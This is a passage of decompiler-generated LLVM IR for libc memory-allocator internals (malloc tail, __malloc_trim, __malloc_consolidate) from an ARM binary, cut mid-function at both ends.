  %v3_16f80 = load i32, i32* %v2_16f80, align 4
  store i32 %v1_16b94, i32* %r1.global-to-local, align 4
  %v1_16f88 = and i32 %v3_16f80, -4
  store i32 %v1_16f88, i32* %r3.global-to-local, align 4
  %v3_16f8c = icmp ult i32 %v1_16f88, %v1_16b94
  br i1 %v3_16f8c, label %dec_label_pc_16fb8, label %dec_label_pc_16f94

dec_label_pc_16f94:                               ; preds = %bb168
  %v0_16f94 = load i32, i32* @sl, align 4
  %v2_16f94 = sub i32 %v1_16f88, %v0_16f94
  %v2_16f98 = add i32 %v0_16f94, %v3_16f7c
  store i32 %v2_16f98, i32* %r1.global-to-local, align 4
  %v1_16f9c = or i32 %v2_16f94, 1
  store i32 %v1_16f9c, i32* %r3.global-to-local, align 4
  %v1_16fa0 = or i32 %v0_16f94, 1
  store i32 %v1_16fa0, i32* %r2.global-to-local, align 4
  %v1_16fa4 = add i32 %v3_16f7c, 8
  store i32 %v1_16fa4, i32* %r0.global-to-local, align 4
  store i32 %v1_16fa0, i32* %v2_16f80, align 4
  %v0_16fac = load i32, i32* %r1.global-to-local, align 4
  %v1_16fac = load i32, i32* %lr.global-to-local, align 4
  %v2_16fac = add i32 %v1_16fac, 44
  %v3_16fac = inttoptr i32 %v2_16fac to i32*
  store i32 %v0_16fac, i32* %v3_16fac, align 4
  %v0_16fb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16fb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16fb0 = add i32 %v1_16fb0, 4
  %v3_16fb0 = inttoptr i32 %v2_16fb0 to i32*
  store i32 %v0_16fb0, i32* %v3_16fb0, align 4
  br label %dec_label_pc_16fc8

dec_label_pc_16fb8:                               ; preds = %bb157, %bb168, %dec_label_pc_16d94
  %v0_16fb8 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16fc0 = inttoptr i32 %v0_16fb8 to i32*
  store i32 12, i32* %v2_16fc0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fc8

dec_label_pc_16fc8:                               ; preds = %bb151, %bb150, %dec_label_pc_16f94, %dec_label_pc_16bdc, %dec_label_pc_16fb8
  %v0_16fc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fc8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %.thread1, %dec_label_pc_16ba8, %.thread121, %dec_label_pc_16a18, %dec_label_pc_16a0c, %dec_label_pc_16874, %dec_label_pc_167f8, %dec_label_pc_16fc8
  store i32 %v2_16720, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r2, align 4
  %v4_16fdc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 28) to i32*), align 4
  store i32 %v4_16fdc, i32* @ip, align 4
  store i32 94184, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16fdc)
  br label %dec_label_pc_16fe8

dec_label_pc_16fe8:                               ; preds = %dec_label_pc_16758, %dec_label_pc_16fcc
  %v0_16fe8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16fe8, i32* %r0.global-to-local, align 4
  store i32 %v3_166f4, i32* @r4, align 4
  store i32 %v6_166f4, i32* @r5, align 4
  store i32 %v9_166f4, i32* @r6, align 4
  store i32 %v12_166f4, i32* @r7, align 4
  store i32 %v15_166f4, i32* @r8, align 4
  store i32 %v18_166f4, i32* @sb, align 4
  store i32 %v21_166f4, i32* @sl, align 4
  store i32 %v24_166f4, i32* @fp, align 4
  store i32 %v27_166f4, i32* @lr, align 4
  ret i32 %v0_16fe8

; uselistorder directives
  uselistorder i32 %v0_16f94, { 1, 0, 2 }
  uselistorder i32 %v3_16f7c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16f78, { 1, 0 }
  uselistorder i32 %v2_16f5c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16f54, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_16f0c, { 1, 2, 0 }
  uselistorder i32 %v0_16ed4, { 1, 0 }
  uselistorder i32 %v0_16ec8, { 1, 0 }
  uselistorder i32 %v2_16eb8, { 1, 0 }
  uselistorder i32 %v2_16e48, { 2, 1, 0 }
  uselistorder i32 %v2_16e30, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16e28, { 1, 0, 2 }
  uselistorder i32 %v1_16e24, { 2, 1, 0 }
  uselistorder i32 %v0_16e24, { 3, 1, 2, 0 }
  uselistorder i32 %v1_16e08, { 1, 0 }
  uselistorder i32 %v2_16de0, { 1, 0 }
  uselistorder i32 %v3_16dd4, { 1, 0, 2 }
  uselistorder i32 %v2_16db4, { 1, 0, 2 }
  uselistorder i32* %v2_16dac, { 1, 0, 2 }
  uselistorder i32 %v0_16d94, { 1, 0 }
  uselistorder i32 %v6_16d70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_16d5c, { 2, 1, 0 }
  uselistorder i32 %v0_16d44, { 1, 0 }
  uselistorder i32 %v2_16d00, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16cfc, { 1, 0 }
  uselistorder i32 %v3_16cd4, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_16cb4, { 1, 0, 2 }
  uselistorder i32 %v2_16c9c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16c44, { 2, 1, 0 }
  uselistorder i32 %v6_16c38, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_16c14, { 2, 1, 0, 3 }
  uselistorder i32 %v3_16bd4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16b94, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_16b8c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16b88, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_16b74, { 1, 0 }
  uselistorder i32 %v7_16b34, { 1, 0 }
  uselistorder i32 %v4_16b34, { 1, 0 }
  uselistorder i32 %v0_16b04, { 1, 0 }
  uselistorder i32 %v2_16ad8, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_16ad454, { 1, 0 }
  uselistorder i32 %v1_16aa0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_16a88., { 1, 2, 0 }
  uselistorder i32 %v0_16a90, { 0, 1, 3, 2 }
  uselistorder i32 %v1_16a90, { 1, 0 }
  uselistorder i32 %v3_16a70, { 1, 0 }
  uselistorder i32 %v4_16a6c, { 1, 0, 2 }
  uselistorder i32 %v1_169dc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a34, { 1, 0 }
  uselistorder i32 %v1_16a18, { 1, 0 }
  uselistorder i32 %v1_168b8, { 1, 0 }
  uselistorder i32 %v0_169f8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_169c0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16a54.pre, { 1, 2, 0 }
  uselistorder i32 %v0_1699c, { 2, 1, 0 }
  uselistorder i32 %v3_16990, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_168b0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_16958, { 1, 0 }
  uselistorder i32 %v3_1694c, { 1, 0 }
  uselistorder i32 %v0_16958, { 1, 0 }
  uselistorder i32 %v3_16930, { 0, 2, 3, 1 }
  uselistorder i32 %v2_16920, { 1, 0, 2 }
  uselistorder i32 %v3_168d8, { 2, 1, 0 }
  uselistorder i32 %v0_168c8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16898, { 1, 0 }
  uselistorder i32 %v1_1684c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16848, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_167ec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_167e0, { 1, 0 }
  uselistorder i32 %v3_167b0, { 1, 0 }
  uselistorder i32 %v0_167a4, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_16784, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16778, { 1, 0 }
  uselistorder i32 %v0_16750, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 49, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_16fe8, { 1, 0 }
  uselistorder label %dec_label_pc_16fcc, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_16fc8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16fb8, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_16f4c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16ec8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16ec0, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_16d94, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_16cc8, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_16b80, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_16ad4, { 1, 0 }
  uselistorder label %dec_label_pc_16adc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16aa0, { 1, 0 }
  uselistorder label %dec_label_pc_16a54, { 1, 0 }
  uselistorder label %dec_label_pc_169e8, { 1, 0 }
  uselistorder label %dec_label_pc_169e4, { 1, 0 }
  uselistorder label %dec_label_pc_16990, { 1, 0 }
  uselistorder label %dec_label_pc_1697c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16944, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16930, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_16ffc(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ffc:
  %v0_16ffc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16ffc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16ffc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16ffc, %bb
  %v10_17010 = phi i32 [ %arg1, %dec_label_pc_16ffc ], [ 0, %bb ]
  ret i32 %v10_17010

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_17014 = add i32 %arg2, 44
  %v2_17014 = inttoptr i32 %v1_17014 to i32*
  %v3_17014 = load i32, i32* %v2_17014, align 4
  %v3_17018 = load i32, i32* @r4, align 4
  store i32 %v3_17018, i32* %stack_var_-20, align 4
  %v12_17018 = load i32, i32* @r7, align 4
  %v1_1701c = add i32 %v3_17014, 4
  %v2_1701c = inttoptr i32 %v1_1701c to i32*
  %v3_1701c = load i32, i32* %v2_1701c, align 4
  %v1_17020 = add i32 %arg2, 860
  %v2_17020 = inttoptr i32 %v1_17020 to i32*
  %v3_17020 = load i32, i32* %v2_17020, align 4
  store i32 %v3_17020, i32* @r4, align 4
  %v1_17024 = and i32 %v3_1701c, -4
  store i32 %v1_17024, i32* @r6, align 4
  %v1_17028 = add i32 %v1_17024, -17
  %v2_1702c = add i32 %v1_17028, %v3_17020
  store i32 %arg2, i32* @r5, align 4
  %v2_17038 = sub i32 %v2_1702c, %arg1
  store i32 %v3_17020, i32* %r1.global-to-local, align 4
  %v2_17040 = udiv i32 %v2_17038, %v3_17020
  %v1_17044 = add i32 %v2_17040, -1
  store i32 %v1_17044, i32* %r0.global-to-local, align 4
  %v2_17048 = mul i32 %v1_17044, %v3_17020
  store i32 %v2_17048, i32* @r7, align 4
  %v2_1704c = icmp eq i32 %v2_17048, 0
  store i1 %v2_1704c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_17048, 1
  br i1 %tmp8, label %dec_label_pc_170b4, label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17058 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_17058, i32* %r0.global-to-local, align 4
  %v0_1705c = load i32, i32* @r5, align 4
  %v1_1705c = add i32 %v0_1705c, 44
  %v2_1705c = inttoptr i32 %v1_1705c to i32*
  %v3_1705c = load i32, i32* %v2_1705c, align 4
  %v0_17060 = load i32, i32* @r6, align 4
  %v2_17060 = add i32 %v0_17060, %v3_1705c
  %v9_17064 = icmp eq i32 %v1_17058, %v2_17060
  store i1 %v9_17064, i1* @cpsr_z, align 1
  store i32 %v1_17058, i32* @r4, align 4
  br i1 %v9_17064, label %dec_label_pc_17070, label %dec_label_pc_170b4

dec_label_pc_17070:                               ; preds = %dec_label_pc_17054
  %v0_17070 = load i32, i32* @r7, align 4
  %v1_17070 = sub i32 0, %v0_17070
  store i32 %v1_17070, i32* %r0.global-to-local, align 4
  %v1_17074 = call i32 @__GI_sbrk(i32 %v1_17070)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1707c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1707c, i32* %r0.global-to-local, align 4
  %v7_17080 = icmp eq i32 %v1_1707c, -1
  store i1 %v7_17080, i1* @cpsr_z, align 1
  br i1 %v7_17080, label %dec_label_pc_170b4, label %dec_label_pc_17088

dec_label_pc_17088:                               ; preds = %dec_label_pc_17070
  %v0_17088 = load i32, i32* @r4, align 4
  %v2_17088 = sub i32 %v0_17088, %v1_1707c
  store i32 %v2_17088, i32* %r0.global-to-local, align 4
  %v9_17088 = icmp eq i32 %v0_17088, %v1_1707c
  store i1 %v9_17088, i1* @cpsr_z, align 1
  br i1 %v9_17088, label %dec_label_pc_170b4, label %dec_label_pc_17090

dec_label_pc_17090:                               ; preds = %dec_label_pc_17088
  %v0_17090 = load i32, i32* @r5, align 4
  %v1_17090 = add i32 %v0_17090, 872
  %v2_17090 = inttoptr i32 %v1_17090 to i32*
  %v3_17090 = load i32, i32* %v2_17090, align 4
  %v1_17094 = load i32, i32* @r6, align 4
  %v2_17094 = sub i32 %v1_17094, %v2_17088
  %v1_17098 = add i32 %v0_17090, 44
  %v2_17098 = inttoptr i32 %v1_17098 to i32*
  %v3_17098 = load i32, i32* %v2_17098, align 4
  store i32 %v3_17098, i32* %r1.global-to-local, align 4
  %v2_1709c = sub i32 %v3_17090, %v2_17088
  %v1_170a0 = or i32 %v2_17094, 1
  store i32 %v1_170a0, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1709c, i32* %v2_17090, align 4
  %v0_170ac = load i32, i32* @r2, align 4
  %v1_170ac = load i32, i32* %r1.global-to-local, align 4
  %v2_170ac = add i32 %v1_170ac, 4
  %v3_170ac = inttoptr i32 %v2_170ac to i32*
  store i32 %v0_170ac, i32* %v3_170ac, align 4
  %v1_170c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_170b8

dec_label_pc_170b4:                               ; preds = %dec_label_pc_17054, %dec_label_pc_17088, %dec_label_pc_17070, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %dec_label_pc_17090, %dec_label_pc_170b4
  %v1_170c0 = phi i32 [ %v1_170c0.pre, %dec_label_pc_17090 ], [ 0, %dec_label_pc_170b4 ]
  %v2_170bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_170bc, i32* @r4, align 4
  store i32 %v12_17018, i32* @r7, align 4
  ret i32 %v1_170c0

; uselistorder directives
  uselistorder i1 %v7_17080, { 1, 0 }
  uselistorder i32 %v1_1707c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_17020, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_170b8, { 1, 0 }
  uselistorder label %dec_label_pc_170b4, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_170c4 = load i32, i32* @r4, align 4
  store i32 %v3_170c4, i32* %stack_var_-36, align 4
  %v0_170c8 = load i32, i32* @r0, align 4
  %v1_170c8 = inttoptr i32 %v0_170c8 to i32*
  %v2_170c8 = load i32, i32* %v1_170c8, align 4
  store i32 %v2_170c8, i32* %r3.global-to-local, align 4
  %v2_170cc = icmp eq i32 %v2_170c8, 0
  store i32 %v0_170c8, i32* @r4, align 4
  br i1 %v2_170cc, label %dec_label_pc_17204.preheader, label %dec_label_pc_170e0

dec_label_pc_17204.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1720c25 = add i32 %v0_170c8, 52
  store i32 %v1_1720c25, i32* %r3.global-to-local, align 4
  %v2_1721426 = add i32 %v0_170c8, 60
  %v3_1721427 = inttoptr i32 %v2_1721426 to i32*
  store i32 %v1_1720c25, i32* %v3_1721427, align 4
  %v0_1721828 = load i32, i32* %r3.global-to-local, align 4
  %v2_1721829 = add i32 %v0_1721828, 12
  %v3_1721830 = inttoptr i32 %v2_1721829 to i32*
  store i32 %v0_1721828, i32* %v3_1721830, align 4
  br label %dec_label_pc_17204.dec_label_pc_17204_crit_edge

dec_label_pc_170e0:                               ; preds = %entry
  %v1_170e0 = and i32 %v2_170c8, -3
  %v3_170e4 = udiv i32 %v2_170c8, 8
  store i32 %v3_170e4, i32* %r2.global-to-local, align 4
  store i32 %v1_170e0, i32* %v1_170c8, align 4
  %v0_170ec = load i32, i32* @r0, align 4
  %v1_170ec = add i32 %v0_170ec, -4
  store i32 %v1_170ec, i32* %r3.global-to-local, align 4
  %v1_170f0 = load i32, i32* %r2.global-to-local, align 4
  %v4_170f0 = mul i32 %v1_170f0, 4
  %v5_170f0 = add i32 %v4_170f0, %v1_170ec
  store i32 %v5_170f0, i32* %sb.global-to-local, align 4
  %v1_170f4 = add i32 %v0_170ec, 52
  store i32 %v1_170f4, i32* %r7.global-to-local, align 4
  %v1_170f8 = add i32 %v0_170ec, 4
  store i32 %v1_170f8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17100

dec_label_pc_17100:                               ; preds = %dec_label_pc_171fc, %dec_label_pc_170e0
  %v1_171f410 = phi i32 [ %v1_171f4, %dec_label_pc_171fc ], [ %v5_170f0, %dec_label_pc_170e0 ]
  %v1_1710c = phi i32 [ %v1_171fc, %dec_label_pc_171fc ], [ %v1_170f8, %dec_label_pc_170e0 ]
  %v1_17100 = inttoptr i32 %v1_1710c to i32*
  %v2_17100 = load i32, i32* %v1_17100, align 4
  store i32 %v2_17100, i32* %r1.global-to-local, align 4
  %v2_17104 = icmp eq i32 %v2_17100, 0
  br i1 %v2_17104, label %dec_label_pc_171f4, label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_17100
  %v0_1710c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1710c, i32* %v1_17100, align 4
  %v0_17110.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17110

dec_label_pc_17110:                               ; preds = %dec_label_pc_171e8, %dec_label_pc_1710c
  %v0_1712c = phi i32 [ %v0_171e8, %dec_label_pc_171e8 ], [ %v0_17110.pre, %dec_label_pc_1710c ]
  %v1_17110 = add i32 %v0_1712c, 4
  %v2_17110 = inttoptr i32 %v1_17110 to i32*
  %v3_17110 = load i32, i32* %v2_17110, align 4
  store i32 %v3_17110, i32* %r3.global-to-local, align 4
  %v1_17114 = and i32 %v3_17110, -2
  store i32 %v1_17114, i32* %lr.global-to-local, align 4
  %v2_17118 = add i32 %v1_17114, %v0_1712c
  store i32 %v2_17118, i32* @r0, align 4
  %v1_1711c = urem i32 %v3_17110, 2
  %v2_1711c = icmp eq i32 %v1_1711c, 0
  %v1_17120 = add i32 %v0_1712c, 8
  %v2_17120 = inttoptr i32 %v1_17120 to i32*
  %v3_17120 = load i32, i32* %v2_17120, align 4
  store i32 %v3_17120, i32* %sl.global-to-local, align 4
  %v1_17124 = add i32 %v2_17118, 4
  %v2_17124 = inttoptr i32 %v1_17124 to i32*
  %v3_17124 = load i32, i32* %v2_17124, align 4
  store i32 %v3_17124, i32* %r8.global-to-local, align 4
  br i1 %v2_1711c, label %dec_label_pc_1712c, label %dec_label_pc_17160

dec_label_pc_1712c:                               ; preds = %dec_label_pc_17110
  %v1_1712c = inttoptr i32 %v0_1712c to i32*
  %v2_1712c = load i32, i32* %v1_1712c, align 4
  store i32 %v2_1712c, i32* %r5.global-to-local, align 4
  %v2_17130 = sub i32 %v0_1712c, %v2_1712c
  store i32 %v2_17130, i32* %r3.global-to-local, align 4
  %v1_17134 = add i32 %v2_17130, 8
  %v2_17134 = inttoptr i32 %v1_17134 to i32*
  %v3_17134 = load i32, i32* %v2_17134, align 4
  store i32 %v3_17134, i32* @ip, align 4
  %v1_17138 = add i32 %v3_17134, 12
  %v2_17138 = inttoptr i32 %v1_17138 to i32*
  %v3_17138 = load i32, i32* %v2_17138, align 4
  store i32 %v3_17138, i32* %r1.global-to-local, align 4
  %v9_1713c = icmp eq i32 %v3_17138, %v2_17130
  %v1_17140 = add i32 %v2_17130, 12
  %v2_17140 = inttoptr i32 %v1_17140 to i32*
  %v3_17140 = load i32, i32* %v2_17140, align 4
  store i32 %v3_17140, i32* %r2.global-to-local, align 4
  br i1 %v9_1713c, label %dec_label_pc_17148, label %dec_label_pc_171a4

dec_label_pc_17148:                               ; preds = %dec_label_pc_1712c
  %v1_17148 = add i32 %v3_17140, 8
  %v2_17148 = inttoptr i32 %v1_17148 to i32*
  %v3_17148 = load i32, i32* %v2_17148, align 4
  store i32 %v3_17148, i32* %r3.global-to-local, align 4
  %v9_1714c = icmp eq i32 %v3_17148, %v2_17130
  br i1 %v9_1714c, label %dec_label_pc_17154, label %dec_label_pc_171a4

dec_label_pc_17154:                               ; preds = %dec_label_pc_17148
  store i32 %v3_17134, i32* %v2_17148, align 4
  %v0_17158 = load i32, i32* %r2.global-to-local, align 4
  %v1_17158 = load i32, i32* @ip, align 4
  %v2_17158 = add i32 %v1_17158, 12
  %v3_17158 = inttoptr i32 %v2_17158 to i32*
  store i32 %v0_17158, i32* %v3_17158, align 4
  %v0_1715c = load i32, i32* %lr.global-to-local, align 4
  %v1_1715c = load i32, i32* %r5.global-to-local, align 4
  %v2_1715c = add i32 %v1_1715c, %v0_1715c
  store i32 %v2_1715c, i32* %lr.global-to-local, align 4
  %v0_17164.pre = load i32, i32* @r0, align 4
  %v0_17168.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17160

dec_label_pc_17160:                               ; preds = %dec_label_pc_17110, %dec_label_pc_17154
  %v0_171d8 = phi i32 [ %v1_17114, %dec_label_pc_17110 ], [ %v2_1715c, %dec_label_pc_17154 ]
  %v0_17168 = phi i32 [ %v3_17124, %dec_label_pc_17110 ], [ %v0_17168.pre, %dec_label_pc_17154 ]
  %v1_1717c = phi i32 [ %v2_17118, %dec_label_pc_17110 ], [ %v0_17164.pre, %dec_label_pc_17154 ]
  %v0_17160 = load i32, i32* @r4, align 4
  %v1_17160 = add i32 %v0_17160, 44
  %v2_17160 = inttoptr i32 %v1_17160 to i32*
  %v3_17160 = load i32, i32* %v2_17160, align 4
  store i32 %v3_17160, i32* %r3.global-to-local, align 4
  %v9_17164 = icmp eq i32 %v1_1717c, %v3_17160
  %v1_17168 = and i32 %v0_17168, -4
  store i32 %v1_17168, i32* %r5.global-to-local, align 4
  br i1 %v9_17164, label %dec_label_pc_171d8, label %dec_label_pc_17170

dec_label_pc_17170:                               ; preds = %dec_label_pc_17160
  %v2_17170 = add i32 %v1_1717c, %v1_17168
  store i32 %v2_17170, i32* %r3.global-to-local, align 4
  %v1_17174 = add i32 %v2_17170, 4
  %v2_17174 = inttoptr i32 %v1_17174 to i32*
  %v3_17174 = load i32, i32* %v2_17174, align 4
  store i32 %v3_17174, i32* %r3.global-to-local, align 4
  %v1_17178 = urem i32 %v3_17174, 2
  %v2_17178 = icmp eq i32 %v1_17178, 0
  %v2_1717c = add i32 %v1_1717c, 4
  %v3_1717c = inttoptr i32 %v2_1717c to i32*
  store i32 %v1_17168, i32* %v3_1717c, align 4
  br i1 %v2_17178, label %dec_label_pc_17184, label %dec_label_pc_17170.dec_label_pc_171b4_crit_edge

dec_label_pc_17170.dec_label_pc_171b4_crit_edge:  ; preds = %dec_label_pc_17170
  %v0_171b8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_171b4

dec_label_pc_17184:                               ; preds = %dec_label_pc_17170
  %v0_17184 = load i32, i32* @r0, align 4
  %v1_17184 = add i32 %v0_17184, 8
  %v2_17184 = inttoptr i32 %v1_17184 to i32*
  %v3_17184 = load i32, i32* %v2_17184, align 4
  store i32 %v3_17184, i32* @ip, align 4
  %v1_17188 = add i32 %v3_17184, 12
  %v2_17188 = inttoptr i32 %v1_17188 to i32*
  %v3_17188 = load i32, i32* %v2_17188, align 4
  store i32 %v3_17188, i32* %r3.global-to-local, align 4
  %v9_1718c = icmp eq i32 %v3_17188, %v0_17184
  %v1_17190 = add i32 %v0_17184, 12
  %v2_17190 = inttoptr i32 %v1_17190 to i32*
  %v3_17190 = load i32, i32* %v2_17190, align 4
  store i32 %v3_17190, i32* %r2.global-to-local, align 4
  br i1 %v9_1718c, label %dec_label_pc_17198, label %dec_label_pc_171a4

dec_label_pc_17198:                               ; preds = %dec_label_pc_17184
  %v1_17198 = add i32 %v3_17190, 8
